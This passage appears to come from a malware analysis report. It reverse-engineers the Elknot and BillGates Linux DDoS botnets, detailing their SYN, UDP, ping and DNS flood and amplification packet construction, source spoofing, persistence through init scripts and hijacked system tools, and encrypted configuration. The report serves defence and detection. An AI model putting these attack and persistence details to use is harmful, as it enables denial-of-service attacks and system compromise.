the\ntarget IP address and port. CThreadAttack::PktAtk supports 5 different types of transmissions.\nEach transmission type is specified by the CSubTask.taskType field. Valid values range from 0x80 to\n0x84. The following table provides a quick map of CSubTask.taskType values to their corresponding\nattack types.\n\n**CSubTask.taskType** **DDoS ATTACK TYPE**\n\n0x80 SYN Flood\n\n0x81 UDP Flood\n\n0x82 Ping Flood\n\n0x83 Random Domain Lookup\n\n0x84 DNS Amplification\n\nIt is the construction of CThreadAttack::PktAtk that differentiates Variant A from Variant B\nElknot malware binaries. Variant A Elknot malware operate against UDP targets exclusively. Variant\nB Elknot malware operate against UDP, TCP, and ICMP targets. Given the differing structures of\nCThreadAttack::PktAtk between Variants A and B, it is best to explore each in isolation.\n\n2.4.1 VARIANT A’s CThreadAttack::PktAtk\nWithin Variant A Elknot malware, each attack type utilizes UDP as the transport mechanism. This is\ncounter-intuitive when considering the fact that a SYN flood requires a TCP Connection and a Ping\nflood requires ICMP. As will be explained in several subsections below, each of the attack types consist\nof datagrams that make up legitimate packets for TCP/IP, UDP/IP, and ICMP/IP. This means that while\nthe transport mechanism may be UDP, encapsulated within the UDP transport is legitimate traffic for\npotentially another network protocol. Effectively, Elknot’s Variant A is either utilizing a form of IP over\nUDP or exhibiting poor network design.\n\nFor the packets that Variant A produces to be useful for the various attack types outside of a UDP\nflood, the UDP portion of the transport must be removed and the underlying protocol’s packets\nintroduced onto the wire. This means that the original endpoint specified by the CSubTask.dwTargetIP\nvalue for each attack must have the means to perform the operation of decapsulating the protocol\nand sending it on otherwise the endpoint will simply become flooded with what appears to be junk\nUDP data.\n\nWhile CThreadAttack::PktAtk may support 5 different types of attacks, a coding anomaly prevents\nCThreadAttack::PktAtk from being able to use all 5 types and only allows for CSubTask.taskType\n= 0x81 and 0x83 to function. At the beginning of CThreadAttack::PktAtk, the function will perform\nthe following range test and alteration to ensure that the supplied CSubTask.taskType value\nconforms to the range of 0x80 to 0x84:\n\nif ( (unsigned __int8)(task->taskType + 0x7D) > 1u )\ntask->taskType = 0x81u;\n\n\n-----\n\nThe problem, however, is that the summation of CSubTask.taskType and 0x7D is cast as an unsigned\nchar value rather than a signed value. As a result, any CSubTask.taskType value that is not 0x83 will\ncause the condition to be true which will result in CThreadAttack::PktAtk resetting the attack type\nto 0x81.\n\nThere is evidence to suggest this coding anomaly may be intentional. As stated previously, the\ntransport protocol for all of the Elknot Variant A malware attack types is UDP. This is seen in\nthe fact that all five attack types utilize the POSIX Socket function sendto (encapsulated within\nthe function CNetBase::Sendto) to transmit the datagram to the Internet at large as well as\ncalling CNetBase::CreateSocket with the protocol set to UDP. The sendto function is used for\nconnectionless protocols such as UDP or raw sockets and requires a valid file descriptor (or socket\ndescriptor, depending on your vernacular preference) which is typically a value greater than 0. The\nattack types for SYN Flood and Ping Flood have the descriptor value hardcoded as 0, effectively\ndisabling their functionality. The fact that the non-UDP based protocols have their sendto descriptor\nvalues set to an invalid value suggest two things:\n\n1. \u0007The Elknot Variant A malware, despite having TCP and ICMP functionality, is intentionally limited\nto UDP-based attacks\n\n2. \u0007The coding anomaly that limited the available attacks to only CSubTask.taskType = 0x81 (UDP\nFlood) and 0x83 (Random Domain Name Lookup) is a limiting feature and not a coding flaw.\n\nOnce begun, a CSubTask attack continues until one or both of the following conditions occurs:\n\n1. The termination flag is set (by calling CManager::StopTask).\n\n2. The duration of the attack has exceeded the value set in CSubTask.dwTaskDuration, which\nspecifies the length of the attack in seconds.\n\nThe following subsections detail each of the CSubTask.taskType attack types available to the\nElknot malware’s Variant A regardless of the malware ability to actually activate the attack. Damian\nMenscher from Google, Inc. was instrumental in helping identify the various types of attacks as they\nwere encapsulated by UDP packets as seen in the Variant A sample.\n\n2.4.1.1 CSubTask.taskType = 0x80: SYN FLOOD\nCSubTask.taskType = 0x80 attacks generate TCP/IP packets designed to aid in SYN attacks.\nEncapsulated within a UDP packet, CThreadAttack::PktAtk generates a TCP/IP packet with the SYN\nflag set (TCP Flags = 0x02), a window offset of 6000 bytes, and the ACK and SEQ fields set to 0.\nCThreadAttack::PktAtk initializes a 0x1000 byte buffer to all 0x00 bytes, making up the payload of\nthe encapsulated TCP packet.\n\n\nNOTE: While Variant A’s CThreadAttack::PktAtk does have the functionality to construct the\npackets for this particular attack type, the transmission capabilities have been disabled (see the\ndiscussion above on the sendto descriptor), and the ability for the Elknot C2 server to select\nthis attack type has been restricted in the Variant A samples Novetta captured and analyzed.\nRegardless, this section will define the packet structure as it would appear on the network if it\nwere accessible and transmittable.\n\n\n-----\n\nThe following diagram illustrates the layout of the TCP/IP packet with the constant values that\nCThreadAttack::PktAtk applies:\n\nThe <Fake Source IP address> contains a value between CSubTask.dwStartIP and CSubTask.\ndwEndIP, incremented by one for each subsequent packet transmitted. The value of <Fake\nSource Port>, similarly, is between CSubTask.wStartPort and CSubTask.wEndPort, incremented\nby one for each new packet. If <Fake Source IP address> or <Fake Source Port> exceed\nCSubTask.dwEndIP or CSubTask.wEndPort, respectively, their values begin again at CSubTask.\ndwStartIP and CSubTask.wStartPort, respectively. The <Target IP> and <Target Port> values\noriginate from the CSubTask.dwTargetIP and CSubTask.wTargetPort values, respectively.\n\nThe total size of the optional payload that follows after the TCP header (and subsequently, contribute to\nthe value of the <Total datagram size> field) is defined by the range between CSubTask.dwMinSize\nand CSubTask.dwMaxSize values. The size of the optional payload begins at CSubTask.dwMinSize and\nincrease by two bytes after each packet Elknot transmits until the upper limited set be\nCSubTask.dwMaxSize is reached at which point the size of the optional data payload starts again at\nCSubTask.dwMinSize.\n\nOnce constructed, CThreadAttack::PktAtk transmits the entire TCP/IP datagram to the target\nby calling CNetBase::Sendto, thus encapsulating the TCP traffic in a UDP packets payload. After\ntransmitting the request, CThreadAttack::PktAtk will immediately generate another datagram in the\nsame manner and repeat the process continuously until the termination signal occurs or the attack’s\nspecified duration has been met.\n\n\n-----\n\n2.4.1.2 CSubTask.taskType = 0x81: UDP FLOOD\nCSubTask.taskType = 0x81 attacks generate a UDP/IP packet consistent with the type of packet\nfound in a UDP Flood attack with the optional payload of the packet consisting of up to 0x1000 bytes\nall set to 0x00. The structure of the datagram takes the form of:\n\nThe <Fake Source IP address> contains a value between CSubTask.dwStartIP and CSubTask.\ndwEndIP, incremented by one for each subsequent packet transmitted. The value of <Fake Source\nPort>, similarly, is between CSubTask.wStartPort and CSubTask.wEndPort, incremented by one for\neach new packet. If <Fake Source IP address> or <Fake Source Port> exceed CSubTask.dwEndIP\nor CSubTask.wEndPort, respectively, their values begin again at CSubTask.dwStartIP and\nCSubTask.wStartPort, respectively. The <Target IP> and <Target Port> values originate from the\nCSubTask.dwTargetIP and CSubTask.wTargetPort values, respectively.\n\nThe total size of the optional payload that follows after the TCP header (and subsequently,\ncontribute to the value of the <Total datagram size> field) is defined by the range between\nCSubTask.dwMinSize and CSubTask.dwMaxSize values. The size of the optional payload begins at\nCSubTask.dwMinSize and increase by two bytes after each packet Elknot transmits until the upper\nlimited set be CSubTask.dwMaxSize is reached at which point the size of the optional data payload\nstarts again at CSubTask.dwMinSize. In practice, the total packet size cannot exceed 0x1000 bytes,\notherwise the static buffer within Elknot used by CThreadAttack::PktAtk to construct the packet\nwould overflow the boundaries.\n\nOnce constructed, CThreadAttack::PktAtk transmits the entire datagram to the target by calling\nCNetBase::Sendto. After transmitting the request, CThreadAttack::PktAtk will immediately generate\nanother datagram in the same manner and repeat the process continuously until the termination\nsignal occurs or the attack’s specified duration has been met.\n\n\n-----\n\n2.4.1.3 CSubTask.taskType = 0x82: PING FLOOD\nCSubTask.taskType = 0x82 attacks generate a pair of ICMP/IP packets consistent with the type of\npackets found in a Ping Flood attack, with a payload of 2048 bytes (combined across both packets).\n\n\nNOTE: While Variant A’s CThreadAttack::PktAtk does have the functionality to construct the\npackets for this particular attack type, the transmission capabilities have been disabled (see the\ndiscussion above on the sendto descriptor), and the ability for the Elknot C2 server to select\nthis attack type has been restricted in the Variant A samples Novetta captured and analyzed.\nRegardless, this section will define the packet structure as it would appear on the network if it\nwere accessible and transmittable.\n\n\nFor the first datagram, CThreadAttack::PktAtk applies a data structure to the initialized buffer that\nconsists of the following:\n\nAfter transmitting the datagram to the target by calling CNetBase::Sendto, CThreadAttack::PktAtk\ngenerates a second datagram with the following structure:\n\n\n-----\n\n2.4.1.4 CSubTask.taskType = 0x83: RANDOM SUBDOMAIN LOOKUP FLOOD\nThis type of transmission targets the DNS protocol. CThreadAttack::PktAtk begins by initializing a\nset of 16 random subdomain names that have the same base domain name as the domain specified\nby CSubTask.strActorRemarks. Each of the random subdomain strings consists of a sequence of\nthe letter “a” of different lengths. The length of each random subdomain string is equal to its index.\nFor example, the first string is “a”, the second string is “aa”, the third is “aaa”, and so on. Each string\nis constructed to conform to the DNS query notion where the first byte for each substring is the\nnumber of characters that follows. As an example, the first random subdomain string (if the target\ndomain is “novetta.com”) would consist of the following bytes:\n\n0x01, ‘a’, 0x07, ‘n’, ‘o’, ‘v’, ‘e’, ‘t’, ‘t’, ‘a’, 0x03, ‘c’, ‘o’, ‘m’\n\nAnd the second random subdomain string would be, for the same example:\n\n0x02, ‘a’, ‘a’, 0x07, ‘n’, ‘o’, ‘v’, ‘e’, ‘t’, ‘t’, ‘a’, 0x03, ‘c’, ‘o’, ‘m’\n\nEach time that the CThreadAttack::PktAtk issues a CSubTask.taskType = 0x83 attack,\nCThreadAttack::PktAtk will mutate a single randomly generated subdomain name by a single\ncharacter by calling CThreadAttack::DomainRandEx. CThreadAttack::DomainRandEx will randomly\nselect a character within the outer level subdomain and replace it with a letter or number in the string\n“abcdefghijklmnopqrstuvwxyz0123456789”.\n\nCThreadAttack::PktAtk will manually construct a DNS query for an A record for the randomly\ngenerated domain name and send the request, via UDP port 53, to the server specified by\nCSubTask.dwTargetIP. After transmitting the request, CThreadAttack::PktAtk will immediately\ngenerate another domain name (using the method described above) and repeat the process of\ngenerating and issuing a DNS query ad nauseum. Given a large enough Elknot botnet, this could\npotentially cripple even well resourced DNS servers.\n\n\n-----\n\nIt is worth noting that, of all of the attack types that Elknot Variant A supports, the random domain\nlookup flood attack is the only attack that does not utilize the IP over UDP encapsulation; rather, it\nsends the DNS request packet directly to the Internet. Despite only sending a DNS request datagram,\nthe portion of CThreadAttack::PktAtk that handles the random domain lookup flood attack will\ngenerate a complete, legitimate UDP/IP packet for a DNS query, but will only send the payload\nsection that contains the DNS request.\n\n2.4.1.5 CSubTask.taskType = 0x84: DNS AMPLIFICATION\nCSubTask.taskType = 0x84 attacks generate a UDP/IP packet consistent with the type of packet\nfound in a DNS amplification attack. Unlike the CSubTask.taskType = 0x83 (Random Domain\nLookup Attack), the packets that the DNS amplification attack generates are encapsulated within a\nUDP transport and not sent directly to the Internet for resolution.\n\n\nNOTE: While variant A’s CThreadAttack::PktAtk does have the functionality to construct the\npackets for this particular attack type, the ability for the Elknot C2 server to select this attack type\nhas been restricted in the Variant A samples that Novetta captured and analyzed. Regardless, this\nsection will define the packet structure as it would appear on the network if it were accessible.\n\n\nCThreadAttack::PktAtk begins by initializing a 0x1000 byte buffer to all 0x00 bytes. The data\nstructure that CThreadAttack::PktAtk applies to the buffer consist of a UDP/IP header followed by a\nDNS query payload. The structure of the datagram takes the form of:\n\n\n-----\n\nThe <Target IP Address> contains a value between CSubTask.dwStartIP and CSubTask.dwEndIP,\nincremented by one for each subsequent packet transmitted. The value of <Target Port>, similarly,\nis between CSubTask.wStartPort and CSubTask.wEndPort, incremented by one for each new\npacket. If <Target IP Address> or <Target Port> exceed CSubTask.dwEndIP or CSubTask.\nwEndPort, respectively, their values begin again at CSubTask.dwStartIP and CSubTask.wStartPort,\nrespectively. The <DNS Server IP Address> value originates from the CSubTask.dwTargetIP. The\n<Domain name> value comes from the CSubTask.strActorRemarks value.\n\nOnce constructed, CThreadAttack::PktAtk transmits the entire datagram to the target by calling\nCNetBase::Sendto. After transmitting the request, CThreadAttack::PktAtk will immediately generate\nanother datagram in the same manner and repeat the process continuously until the termination\nsignal occurs or the attack’s specified duration has been met.\n\nNote that while the previously defined attacks use CSubTask.dwStartIP/CSubTask.dwEndIP and\nCSubTask.wStartPort/CSubTask.wEndPort to specify fake source information, in the case of a DNS\namplification attack it is necessary to have the fake source represent the real target of the attack. This\nis necessary because the DNS server will use the information to send back datagrams representing\nthe answer to the query the attack generates.\n\n2.4.2 VARIANT B’s CThreadAttack::PktAtk\nThe overall structure of CThreadAttack::PktAtk in the Elknot malware’s Variant B samples is\nclose to that of the CThreadAttack::PktAtk for the Variant A samples. The difference comes\nfrom the method by which Variant B transmits attack packets. While Variant A uses a SOCK_DGRAM\n(datagram) type socket with the UDP protocol exclusively, Variant B samples use a SOCK_RAW (raw)\ntype socket with the protocol depending on the type of attack. As part of the initialization of the\nCThreadAttack::PktAtk function, the function calls CNetBase::CreateRawSocket to generate a raw\nsocket for the appropriate protocol as it relates to the specified attack type. The table below maps\nthe various attack types to the network protocol that the attack uses:\n\n**ATTACK TYPE (CSubTask.taskType)** **PROTOCOL**\n\n0x80 (SYN Flood) TCP\n\n0x81 (UDP Flood) UDP\n\n0x82 (Ping Flood) IP\n\n0x83 (Random Domain Lookup) UDP\n\n0x84 (DNS Amplification) UDP\n\nAfter generating a socket, the socket is configured by calling CNetBase::SetSendTimeOut to lower\nthe timeout to 1 second, CNetBase::SetSendBufSize to effectively disable the transmit queue\n(thereby forcing rapid packet transmission) and CNetBase::SetHdrIncl to disable the inclusion of the\nIP header by the networking subsystem of Linux.\n\n\n-----\n\nThe use of a raw network socket provides Variant B samples with a greater flexibility than their\nVariant A counterparts. At the same time it also explains the structure of the attack packets\nthat the Variant A samples generate. The codebase between Variant A and Variant B samples is\nremarkably similar. The functional structure between the Variants is nearly identical, except for\nthe various CNetBase functions previously listed and the use of CNetBase::CreateRawSocket over\nCNetBase::CreateSocket for the socket generation. The structure of each attack packet is also the\nsame between Variants A and B, with changes only in the transport layer. Therefore it is not a leap\nto assume that the authors originally wrote the Variant B source code and then modified the source\ncode to fit whatever need arose to limit the Variant A samples to using UDP. In any case, the result\nis that the Variant B samples provide the full spectrum of available attack types, without restriction,\nwhile the Variant A samples retain the ghosts of such functionality.\n\nThe following subsections detail each of the CSubTask.taskType attack types available to the Elknot\nmalware’s Variant B. The structure of the packets for each attack mirrors the structure of the packets\nwithin the Variant A’s attacks but the difference, as noted above, is that the Variant B datagrams\nrepresent actual network packets, not datagrams encapsulated in UDP/IP.\n\n2.4.2.1 CSubTask.taskType = 0x80: SYN FLOOD\nCSubTask.taskType = 0x80 attacks generate TCP/IP packets designed to aid in SYN attacks.\nCThreadAttack::PktAtk generates a TCP/IP packet with the SYN flag set (TCP Flags =\n0x02), a window offset of 6000 bytes, and the ACK and SEQ fields set to 0. Variant B’s\nCThreadAttack::PktAtk generates the exact same packet, using the exact same IP and port value\ngeneration, as Variant A for the SYN flood attack as defined in Section 2.4.1.1.\n\nOnce constructed, CThreadAttack::PktAtk transmits the entire TCP/IP datagram to the target by\ncalling CNetBase::Sendto. The use of a raw socket and CNetBase::Sendto means that Variant B\nsends a true spoofed packet instead of a UDP/IP encapsulated TCP/IP packet. After transmitting the\nrequest, CThreadAttack::PktAtk will immediately generate another datagram in the same manner\nand repeat the process continuously until the termination signal occurs or the attack’s specified\nduration has been met.\n\n2.4.2.2 CSubTask.taskType = 0x81: UDP FLOOD\nCSubTask.taskType = 0x81 attacks generate a UDP/IP packet consistent with the type of packet\nfound in a typical UDP Flood attack with the optional payload of the packet consisting of up to\n0x1000 bytes all set to 0x00. Variant B’s CThreadAttack::PktAtk generates the exact same packet,\nusing the exact same IP and port value generation, as Variant A for the UDP flood attack as defined\nin Section 2.4.1.2.\n\nCThreadAttack::PktAtk transmits the entire datagram to the target by calling CNetBase::Sendto.\nThe use of a raw socket and CNetBase::Sendto means that Variant B sends a true spoofed\npacket instead of a UDP/IP encapsulated UDP/IP packet. After transmitting the request,\nCThreadAttack::PktAtk will immediately generate another datagram in the same manner and repeat\nthe process continuously until the termination signal occurs or the attack’s specified duration has\nbeen met.\n\n\n-----\n\n2.4.2.3 CSubTask.taskType = 0x82: PING FLOOD\nCSubTask.taskType = 0x82 attacks generate a pair of ICMP/IP packets consistent with the type of\npackets found in a Ping Flood attack, with a payload of 2048 bytes (combined across both packets).\nVariant B’s CThreadAttack::PktAtk generates the exact same packet pair, using the exact same IP\nand port value generation, as Variant A for the Ping flood attack as defined in Section 2.4.1.3.\n\nOnce each ICMP/IP packet is constructed, CThreadAttack::PktAtk transmits the entire datagram\nto the target by calling CNetBase::Sendto. The use of a raw socket and CNetBase::Sendto means\nthat Variant B sends a true spoofed packet instead of a UDP/IP encapsulated ICMP/IP packet. After\ntransmitting the request, CThreadAttack::PktAtk will continually generate the new datagram pairs\nuntil the termination signal occurs or the attack’s specified duration has been met.\n\n2.4.2.4 CSubTask.taskType = 0x83: RANDOM SUBDOMAIN LOOKUP FLOOD\nThis type of transmission targets the DNS protocol. Variant B’s CThreadAttack::PktAtk uses the\nexact same method as Variant A’s random domain lookup flood packet generator to generate a\nrandom subdomain of the target domain to query (see section 2.4.1.4). However, unlike Variant A\nwhich sends the DNS query over a normal UDP socket, Variant B generates the entire UDP/IP packet\nin addition to the DNS request datagram.\n\nThe structure of the datagram generated by CSubTask.taskType = 0x83 takes the form of:\n\n\n-----\n\nThe <Fake Source IP address> contains a value between CSubTask.dwStartIP and CSubTask.dwEndIP,\nincremented by one for each subsequent packet transmitted. The value of <Fake Source Port>,\nsimilarly, is between CSubTask.wStartPort and CSubTask.wEndPort, incremented by one for each\nnew packet. If <Fake Source IP address> or <Fake Source Port> exceed CSubTask.dwEndIP or\nCSubTask.wEndPort, respectively, their values begin again at CSubTask.dwStartIP and CSubTask.\nwStartPort, respectively. The <Target IP> value originates from the CSubTask.dwTargetIP values.\n\nEach time that the CThreadAttack::PktAtk issues a CSubTask.taskType = 0x83 attack,\nCThreadAttack::PktAtk will mutate a single randomly generated subdomain name by a single\ncharacter by calling CThreadAttack::DomainRandEx. CThreadAttack::DomainRandEx will randomly\nselect a character within the outer level subdomain and replace it with a letter or number in the string\n“abcdefghijklmnopqrstuvwxyz0123456789”.\n\nOnce constructed, CThreadAttack::PktAtk transmits the entire UDP/IP packet with DNS\nquery datagram to the specified DNS by calling CNetBase::Sendto. The use of a raw socket\nand CNetBase::Sendto means that Variant B sends a true spoofed packet instead of a UDP/\nIP encapsulated UDP/IP packet. After transmitting the request, CThreadAttack::PktAtk will\nimmediately generate another datagram in the same manner and repeat the process continuously\nuntil the termination signal occurs or the attack’s specified duration has been met.\n\n2.4.2.5 CSubTask.taskType = 0x84: DNS AMPLIFICATION\nCSubTask.taskType = 0x84 attacks generate a UDP/IP packet consistent with the type of packet\nfound in a DNS amplification attack. Variant B’s CThreadAttack::PktAtk generates the exact same\npacket, using the exact same IP and port value generation, as Variant A for the DNS amplification\nattack as defined in Section 2.4.1.5.\n\nOnce constructed, CThreadAttack::PktAtk transmits the entire UDP/IP packet with DNS\nquery datagram to the specified DNS by calling CNetBase::Sendto. The use of a raw socket\nand CNetBase::Sendto means that Variant B sends a true spoofed packet instead of a UDP/\nIP encapsulated UDP/IP packet. After transmitting the request, CThreadAttack::PktAtk will\nimmediately generate another datagram in the same manner and repeat the process continuously\nuntil the termination signal occurs or the attack’s specified duration has been met.\n\n3. BILLGATES MALWARE ANALYSIS\n\n\nSource Sample SHA-256:\nb11a6bd1bcbb759252fb252ee1122b68d44dcc275919cf95af429721767c040a\nedb59ca2fdbf2afb45755fa307f4274b0029b7a80b62fb13895574894bc17205\nf018976240911e5eb6bb7051fc2a4590a480a61e744f57e69e63880ffc84aea3\n\n\nThe BillGates malware[9] is the big brother of the Elknot payload malware. Like the Elknot payload\nmalware, the BillGates malware is a gcc-compiled binary with the runtime library statically linked and\nwith the function names intact. According to the information present within the binary, BillGates is\nmade up of 39 C++ files. Many of the files within BillGates mirror Elknot source code files, as seen in\nthe following table mapping the source code files of BillGates to Elknot’s, in order of compilation.\n\n_9 ValdikSS “Исследуем Linux Botnet «BillGates»” http://habrahabrru/post/213973/ 26 February 2014_\n\n\n-----\n\n**BillGates Source Code Files** **Elknot Source Code Files**\n\nFake.cpp\n\nAmpResource.cpp\n\nAttack.cpp\n\nCmdMsg.cpp\n\nConfigDoing.cpp\n\nExChange.cpp\n\nGlobal.cpp Global.cpp\n\nMain.cpp Main.cpp\n\nManager.cpp Manager.cpp\n\nMiniHttpHelper.cpp\n\nProtocolUtil.cpp\n\nProvinceDns.cpp\n\nServerIP.cpp\n\nStatBase.cpp StatBase.cpp\n\nSysTool.cpp\n\nThreadAtk.cpp ThreadAttack.cpp\n\nThreadClientStatus.cpp ThreadHostStatus.cpp\n\nThreadConnection.cpp\n\nThreadFakeDetect.cpp\n\nThreadHttpGet.cpp\n\nThreadLoopCmd.cpp\n\nThreadMonGates.cpp\n\nThreadRecycle.cpp\n\nThreadShell.cpp\n\nThreadShellRecycle.cpp\n\nThreadTask.cpp ThreadTaskManager.cpp\n\nThreadTimer.cpp\n\nThreadUpdate.cpp\n\nUserAgent.cpp\n\nAutoLock.cpp AutoLock.cpp\n\nBigInt.cpp\n\nFileOp.cpp FileOp.cpp\n\nLog.cpp Log.cpp\n\nMd5.cpp\n\nMedia.cpp Media.cpp\n\nNetBase.cpp NetBase.cpp\n\nRSA.cpp\n\nThreadCondition.cpp ThreadCondition.cpp\n\nThread.cpp Thread.cpp\n\nThreadMutex.cpp ThreadMutex.cpp\n\nUtility.cpp Utility.cpp\n\nWinDefSVC.cpp\n\n\n-----\n\nStructurally, the BillGates binary has strong similarities to Elknot in its use of asynchronous threads,\nmessage queuing and passing, and status management. Functionally, however, the BillGates malware\nis significantly more complex than Elknot and provides the following additional features to the actors\nwho deploy the malware:\n\n - Remote shell functionality\n\n - Ability to operate as both a client and a server\n\n - Ability to intervene between legitimate system tools (ps, lsof, and lsof) and users\n\nWhile Elknot has a rather straightforward startup, BillGates’s is more involved. The main function\nprovides several different startup methods for the malware:\n\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\nsigned int dwGateType;\nstd::string strMonFile;\n\nCUtility::EString(&strMonFile, “/usr/bin/.sshd”);\nstd::string::operator=(&g_strMonitorFile, &strMonFile);\nstd::string::~string(&strMonFile);\ndwGateType= CSysTool::CheckGatesType();\nif ( dwGateType== 1 )\n{\nMainBeikong();\n}\nelse if ( dwGateType> 1 )\n{\nif ( dwGateType== 2 )\n{\nMainBackdoor();\n}\nelse if ( dwGateType== 3 )\n{\nMainSystool(argc, argv);\n}\n}\nelse if ( !dwGateType )\n{\nMainMonitor();\n}\nreturn 0;\n}\n\nThe malware begins by establishing a global variable that contains the filename and path of the\n“monitor” file. Note that the file path “/usr/bin/.sshd” shown in the example above is not a normal\nLinux file, but can be used as a potential indicator of compromise. The monitor file represents\nthe base installation of the BillGates malware in its running state. To this end, the next task the\nmalware performs is the termination of the current “gate” in which it is running. In the context\nof the malware, a gate is the particular mode that the malware is operating under. The function\nCSysTool::CheckGatesType handles the determination of the current gate. There are four possible\ngates, identified as 0 through 3, and the method for determining the current gate is illustrated in the\nfollowing table:\n\n\n-----\n\n**GATE** **CONDITION**\n\n0 Current executable image’s filename and path\nmatch that of the monitor file.\n\n1 Current executable image’s filename and path do\nnot match the conditions for any other gate type.\nThis is an exclusionary condition contrary to the\nother gates’ inclusionary conditions.\n\n2 Current executable image’s filename and path\nmatch /usr/bin/getty\n\n3 Current executable image’s filename and path\nmatch that of one of the following system tools:\n/bin/netstat\n/bin/lsof\n/bin/ps\n/usr/bin/netstat\n/usr/bin/lsof\n/usr/bin/ps\n/usr/sbin/netstat\n/usr/sbin/lsof\n/usr/sbin/ps\n\nEach gate operates with a different purpose which allows the BillGates malware, as a single entity,\nto perform multiple, unique functions, making it a surprisingly versatile application. Trying to\nunderstand BillGates at the macro level can therefore be difficult given the fact that it can operate in\nfour different modes. The following sections look at each gate within BillGates in isolation, which is\nultimately how each gate operates with respect to one another.\n\n3.1 GATE 0: INFECTION MONITOR\nGate 0 represents the infection monitor for BillGates. The infection monitor, as the name implies, is\ntasked with continually monitoring the list of active processes to determine if the process generated\nby gate 1 (known as Host mode) is currently running.\n\nThe infection monitor begins by calling daemon in order to detach itself from the active terminal\nsession. The infection monitor then calls CSysTool::SelfInit with three strings:\n\n\n-----\n\nCSysTool::SelfInit uses the three strings as the inputs into a RSA decryption function\n(CRSA::Decrypt). The first string represents the large number C, the second string represents the\nlarge number N and the third string represents the large number D that is necessary to satisfy\nthe equation M = C[D] mod N where M is the decrypted string contained within C. After calculating\nthe value for M, the value represents a string of bytes that make up an ASCII string containing the\nconfiguration for the BillGates malware when run in infection monitor mode.\n\nThe configuration string consists of 9 fields separated by a colon with the following format:\n\n{C2 address}:{C2 Port}:{Is Listener}:{Is Service}:{Campaign Remark}:{Enable Backdoor}:{C Offset}:{D\nOffset}:{N Offset}\n\nEach of the fields within the configuration string maps to a global variable within the BillGates binary.\nThe following table maps the configuration string fields to their respective global variables and\nprovides some explanation of each field’s meaning and purpose.\n\n**BILLGATES VARIABLE**\n**FIELD** **DESCRIPTION**\n**NAME**\n\n{C2 address} g_strConnTgts Domain or IP address of the C2 server.\n\n{C2 Port} g_iGatsPort C2 Server’s listening port\n\nIf “1” then when running as gate 1 or gate 2, the\n{Is Listener} g_iGatsIsFx\nmalware opens a listening port.\n\nIf “1” then the malware installs itself as a service\n{Is Service} g_iIsService (within the rc?.d folders as well as init.d) when\nrunning under gate 1.\n\n\n{Campaign\ng_strForceNote\nRemark}\n\n\nA string value that is sent to the C2 server whenever\nan “initial response” packet is sent from the malware.\nThe most likely use of this string is a custom campaign\nremark such as Elknot’s CSubTasks.trActorRemarks\nfield.\n\n\nIf “1” then the malware activates a backdoor\n{Enable\ng_bDoBackdoor application (e.g. /usr/bin/getty) during gate 1’s\nBackdoor}\ninitialization.\n\nThe offset within the binary of the C string used by\n{C Offset} g_strCryptStart CSysTool::InitSelf for the current configuration\nstring. The value is unused.\n\nThe offset within the binary of the D string used by\n{D Offset} g_strDStart CSysTool::InitSelf for the current configuration\nstring. The value is unused.\n\nThe offset within the binary of the N string used by\n{N Offset} g_strNStart CSysTool::InitSelf for the current configuration\nstring. The value is unused.\n\n\n-----\n\nAfter setting the global variables based on the content of the configuration string, the infection\nmonitor records its current process identifier (PID) in the text file /tmp/moni.lock. The location\nof the binary when operating as gate 1 is recorded by calling CSysTool::GetBeikongPathfile\nwhich in turn queries the contents of the file /tmp/notify.file (if it exists). The filename and\npath to the gate 1 binary is then used to initialize a new CThreadMonGate object. The infection\nmonitor calls CThreadMonGate::Start which in turn activates CThreadMonGate::ProcessMain. The\nCThreadMonGate::ProcessMain function has a very simple but singular purpose: monitor if the file\n/tmp/gates.lock has an active file lock. The infection monitor will check to ensure that the /tmp/\ngates.lock file is locked (i.e. in exclusive use by another process ) every 60 seconds, and if the\ninfection monitor fails to find it locked it will call CSysTool::ReleaseAndStartGates to restart the\nHost mode binary which is responsible for maintaining the exclusive lock on the /tmp/gates.lock file.\n\nThe CSysTool::ReleaseAndStartGates function copies the current executable file to the filename\nand path obtained via the earlier CSysTool::GetBeikongPathfile call. The newly copied file is then\nactivated via a call to the system function. The infection monitor then sleeps for 1 second before\ncalling CSysTool::RunLinuxShell, which executes the newly copied file once more before forking the\ncurrent process in order to wait for the new process to activate. Essentially, this is a highly convoluted\nway of merely making sure that the gate 1 version of BillGates is constantly running.\n\n3.2 GATE 1: HOST (BEIKONGDUAN) MODE\nThe main functionality of BillGates exists within the Host mode, gate 1. Initiated when main calls\nMainBeikong[10], Host mode begins by calling daemon. Next, MainBeikong calls CSysTools::SelfInit\nusing the same encrypted configuration string used by gate 0. Host mode terminates the processes\nindicated by the PID values within /tmp/moni.lock and /tmp/bill.lock by passing both file paths\nto CSysTool::KillPid. CSysTool::KillPid will kill any PID specified within the supplied file if the PID\ndoes not match the current process’s PID. The /tmp/bill.lock file is deleted.\n\nTo check if the PID contained within /tmp/gates.lock exists, the Host makes a call to\nCSysTool::KillGatesIfExist and terminates the process if the PID is currently active, then replaces\nthe /tmp/gates.lock file’s contents with the current process’s PID. This effectively claims ownership\nas the active Host mode process on the victim’s system. If this procedure fails for any reason, the\nHost mode binary will quietly terminate.\n\nMainBeikong determines if the global variable g_IsService is set to 1. If so, CUtility::SetAutoStart\nis called with “DbSecuritySpt” specified as the service name and 97 specified as the start level.\nCUtility::SetAutoStart is responsible for installing a startup script within the /etc/init.d/\ndirectory of the victim’s machine. The script consists of only two lines:\n\n#!/bin/bash\n{name of binary}\n\nFor run levels 0 through 4, CUtility::SetAutoStart will perform a ln -s to ensure that the\nBillGates binary, in gate 1 mode, activates at each of the levels. The name and level given to\nCUtility::SetAutoStart are used to construct the filename for the service. For instance, in the case\nwhere “DbSecuritySpt” is given as the service name and 97 as the level, the resulting filename within\neach of the /etc/rc?.d directories is SDbSecuritySpt97.\n\n_10\u0007“Beikong” may refer to “Beikongduan”, which is the pinyin for “host” in Chinese._\n\n\n-----\n\nIf the global variable g_bDoBackdoor is set by the configuration and the BillGates process\nis currently running as root, MainBeikong will kill the current backdoor mode process by\nterminating the PID specified in /usr/bin/bsd-port/getty.lock. Similarly, the PID specified in\n/usr/bin/bsd-port/udevd.lock is terminated and the udevd.lock file deleted. Finally, the\nCSysTool::ReleaseAndStartGates function is called in order to activate the backdoor mode (gate 2)\nbinary as getty and establish the /usr/bin/bsd-port/getty.lock file.\n\nIf the process is running as root, the function CSysTool::SetBeikongPathFile is called in order to set\nthe /tmp/notify.file with the current process’s PID value. The value of g_strMonitorFile is then\npassed to CSysTool::ReleaseAndStartGates in order to activate the infection monitor. If, however,\nthe host mode process is not running as root, the /tmp/notify.file is deleted.\n\nWith the initialization phase of 